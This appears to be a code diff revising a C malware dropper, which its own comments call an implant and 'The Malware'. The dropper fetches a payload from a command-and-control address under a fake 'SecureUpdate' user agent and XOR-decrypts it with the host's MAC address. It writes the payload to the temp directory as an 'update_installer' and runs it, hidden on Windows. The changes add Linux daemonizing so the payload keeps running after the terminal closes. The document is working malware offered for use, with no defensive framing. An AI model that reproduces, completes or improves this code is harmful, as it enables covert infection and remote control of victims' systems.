@@ -7,7 +7,7 @@
     #include <windows.h>
     #include <winhttp.h>
     #include <iphlpapi.h>
-    #include <shellapi.h> // For ShellExecute
+    #include <shellapi.h>
     #pragma comment(lib, "winhttp.lib")
     #pragma comment(lib, "iphlpapi.lib")
     #pragma comment(lib, "shell32.lib")
@@ -20,7 +20,8 @@
     #include <net/if.h>
     #include <sys/ioctl.h>
     #include <netdb.h>
-    #include <sys/stat.h> // For chmod
+    #include <sys/stat.h>
+    #include <fcntl.h> // Required for open()
 #endif
 
 // DEFAULTS
@@ -31,7 +32,7 @@
 #define USER_AGENT L"SecureUpdate/1.0"
 #define USER_AGENT_LINUX "SecureUpdate/1.0"
 
-// ================= MAC ADDRESS LOGIC (Unchanged) =================
+// ================= MAC ADDRESS LOGIC =================
 void GetMacAddress(unsigned char* mac) {
 #ifdef _WIN32
     PIP_ADAPTER_INFO pAdapterInfo;
@@ -61,58 +62,83 @@ void GetMacAddress(unsigned char* mac) {
 #endif
 }
 
-// ================= NEW: DROP AND EXECUTE LOGIC =================
+// ================= UNIVERSAL DROP & EXECUTE =================
 void DropAndExecute(unsigned char* data, int size) {
     char filepath[512];
 
 #ifdef _WIN32
-    // 1. Get Temp Path (e.g., C:\Users\Admin\AppData\Local\Temp\)
+    // --- Windows Implementation ---
     char tempPath[MAX_PATH];
     GetTempPathA(MAX_PATH, tempPath);
-    
-    // 2. Create Filename (e.g., update.exe)
     sprintf(filepath, "%s%s", tempPath, "update_installer.exe");
     printf("[*] Dropping to: %s\n", filepath);
 
-    // 3. Write File
     FILE* fp = fopen(filepath, "wb");
     if (fp) {
         fwrite(data, 1, size, fp);
         fclose(fp);
         
-        // 4. Execute using ShellExecute (Non-blocking)
-        printf("[*] Executing Payload...\n");
+        // Use ShellExecute with SW_HIDE to run invisible
+        printf("[*] Executing Payload (Hidden)...\n");
         ShellExecuteA(NULL, "open", filepath, NULL, NULL, SW_HIDE);
     }
 
 #elif __linux__
-    // 1. Set Path (/tmp/update_installer)
+    // --- Linux Implementation (The Permanent Fix) ---
     sprintf(filepath, "/tmp/update_installer");
     printf("[*] Dropping to: %s\n", filepath);
 
-    // 2. Write File
     FILE* fp = fopen(filepath, "wb");
     if (fp) {
         fwrite(data, 1, size, fp);
         fclose(fp);
 
-        // 3. Make Executable (chmod +x)
+        // 1. Make Executable
         chmod(filepath, 0755);
 
-        // 4. Execute
-        printf("[*] Executing Payload...\n");
-        // Fork to run in background so implant doesn't hang
-        if (fork() == 0) {
-            execl(filepath, filepath, NULL);
+        printf("[*] Daemonizing Payload...\n");
+
+        // 2. Fork Process
+        pid_t pid = fork();
+
+        if (pid < 0) {
+            printf("[-] Fork failed\n");
+            exit(1);
+        }
+
+        if (pid > 0) {
+            // PARENT: Exit immediately.
+            // This returns control to the terminal while the child keeps running.
+            printf("[+] Payload detached. PID: %d\n", pid);
             exit(0);
         }
+
+        // --- CHILD PROCESS (The Malware) ---
+        
+        // 3. Create New Session (The Magic Fix)
+        // This detaches the process from the terminal. 
+        // Closing the terminal will NOT kill this process anymore.
+        setsid(); 
+
+        // 4. Redirect IO to /dev/null
+        // This prevents the payload from crashing if it tries to print to a closed terminal.
+        int devNull = open("/dev/null", O_RDWR);
+        dup2(devNull, STDIN_FILENO);
+        dup2(devNull, STDOUT_FILENO);
+        dup2(devNull, STDERR_FILENO);
+        close(devNull);
+
+        // 5. Execute
+        execl(filepath, filepath, NULL);
+        
+        // If we reach here, execution failed
+        exit(1);
     }
 #endif
 }
 
 // ================= MAIN LOGIC =================
 int main(int argc, char* argv[]) {
-    // 1. Parse Arguments
     char* targetIP = DEFAULT_IP;
     int targetPort = DEFAULT_PORT;
     if (argc > 1) targetIP = argv[1];
@@ -120,13 +146,13 @@ int main(int argc, char* argv[]) {
 
     printf("[*] Configuration: Connecting to %s:%d\n", targetIP, targetPort);
 
-    // 2. Get MAC
+    // Get MAC
     unsigned char macKey[6] = {0};
     GetMacAddress(macKey);
     printf("[*] Detected MAC: %02X-%02X-%02X-%02X-%02X-%02X\n", 
         macKey[0], macKey[1], macKey[2], macKey[3], macKey[4], macKey[5]);
 
-    // 3. Download Logic
+    // Download Logic
     unsigned char* buffer = NULL;
     int fileSize = 0;
 
@@ -151,13 +177,17 @@ int main(int argc, char* argv[]) {
     serv_addr.sin_family = AF_INET;
     serv_addr.sin_port = htons(targetPort);
     if(inet_pton(AF_INET, targetIP, &serv_addr.sin_addr)<=0) return -1;
-    if (connect(sock, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) < 0) return 1;
+    if (connect(sock, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) < 0) {
+        printf("[-] Failed to connect\n");
+        return 1;
+    }
 
     char request[512];
     sprintf(request, "GET %s HTTP/1.0\r\nUser-Agent: %s\r\nHost: %s\r\n\r\n", C2_PATH_LINUX, USER_AGENT_LINUX, targetIP);
     send(sock, request, strlen(request), 0);
 
-    unsigned char tempBuf[1000000]; // Larger buffer for full binaries
+    // Buffer increased for large payloads
+    unsigned char tempBuf[5000000]; 
     int valread = read(sock, tempBuf, sizeof(tempBuf));
     
     int header_end = 0;
@@ -178,13 +208,13 @@ int main(int argc, char* argv[]) {
     if (fileSize > 0 && buffer != NULL) {
         printf("[+] Downloaded %d bytes.\n", fileSize);
 
-        // 4. Decrypt
+        // Decrypt
         for (int i = 0; i < fileSize; i++) {
             buffer[i] = buffer[i] ^ macKey[i % 6];
         }
         printf("[+] Decrypted.\n");
 
-        // 5. DROP AND EXECUTE (Instead of Memory Execution)
+        // DROP AND EXECUTE
         DropAndExecute(buffer, fileSize);
         
     } else {
